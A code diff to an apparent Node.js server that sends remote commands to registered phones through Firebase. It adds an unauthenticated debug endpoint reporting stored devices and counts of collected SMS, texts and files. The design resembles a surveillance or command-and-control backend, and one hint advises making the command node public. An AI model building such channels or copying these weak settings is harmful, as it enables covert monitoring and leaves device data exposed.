@@ -187,35 +187,77 @@ app.post('/api/command', (req, res) => {
     const userId = db.devices[deviceId];
 
     if (!userId) {
-        return res.status(404).json({ error: "User-ID not found for this device. Wait for it to sync once." });
+        console.log(`[CMD] ❌ No userId mapped for device: ${deviceId}`);
+        console.log(`[CMD]    Known devices: ${JSON.stringify(db.devices)}`);
+        return res.status(404).json({ error: "User-ID not found for this device. The app must upload data at least once to register." });
     }
 
     // Update Firebase via REST API
-    const url = `${FIREBASE_URL}/commands/${userId}/command.json`;
-    const data = JSON.stringify(command);
+    const firebaseUrl = `${FIREBASE_URL}/commands/${userId}/command.json`;
+    const cmdData = JSON.stringify(command);
 
-    const firebaseReq = https.request(url, {
+    console.log(`[CMD] Attempting: PUT ${firebaseUrl} ← "${command}" for device ${deviceId}`);
+
+    const firebaseReq = https.request(firebaseUrl, {
         method: 'PUT',
         headers: {
             'Content-Type': 'application/json',
-            'Content-Length': data.length
+            'Content-Length': Buffer.byteLength(cmdData)
         }
     }, (firebaseRes) => {
         let body = '';
         firebaseRes.on('data', chunk => body += chunk);
         firebaseRes.on('end', () => {
-            console.log(`[CMD] Sent ${command} to ${userId} (${deviceId})`);
-            res.json({ success: true, command, userId });
+            const status = firebaseRes.statusCode;
+            if (status >= 200 && status < 300) {
+                console.log(`[CMD] ✅ Firebase accepted: ${command} → ${userId} (HTTP ${status})`);
+                res.json({ success: true, command, userId, firebaseStatus: status });
+            } else {
+                console.error(`[CMD] ❌ Firebase REJECTED: HTTP ${status} — ${body}`);
+                res.status(502).json({ 
+                    success: false, 
+                    error: `Firebase rejected the command (HTTP ${status})`,
+                    firebaseResponse: body,
+                    hint: status === 401 ? "Database rules require authentication. Set commands node to public or add auth token." :
+                          status === 403 ? "Permission denied. Check Firebase Realtime Database rules." : 
+                          "Unknown Firebase error."
+                });
+            }
         });
     });
 
     firebaseReq.on('error', (e) => {
-        console.error("Firebase Command Error:", e);
-        res.status(500).json({ error: "Failed to reach Firebase" });
+        console.error("[CMD] ❌ Network error reaching Firebase:", e.message);
+        res.status(500).json({ error: "Failed to reach Firebase: " + e.message });
     });
 
-    firebaseReq.write(data);
+    firebaseReq.write(cmdData);
     firebaseReq.end();
+});
+
+// ─── DEBUG: Test Firebase connectivity ────────────────────────────────────────
+app.get('/api/debug/firebase', (req, res) => {
+    const testUrl = `${FIREBASE_URL}/.json?shallow=true`;
+    https.get(testUrl, (fbRes) => {
+        let body = '';
+        fbRes.on('data', chunk => body += chunk);
+        fbRes.on('end', () => {
+            const db = readData();
+            res.json({
+                firebaseUrl: FIREBASE_URL,
+                firebaseStatus: fbRes.statusCode,
+                firebaseResponse: body.substring(0, 500),
+                knownDevices: db.devices || {},
+                devicesInfo: db.devices_info || {},
+                totalTexts: (db.texts || []).length,
+                totalSms: (db.sms || []).length,
+                totalFiles: (db.files || []).length,
+                serverTime: moment().format('YYYY-MM-DD HH:mm:ss')
+            });
+        });
+    }).on('error', (e) => {
+        res.status(500).json({ error: "Cannot reach Firebase: " + e.message });
+    });
 });
 
 // API endpoint for live polling
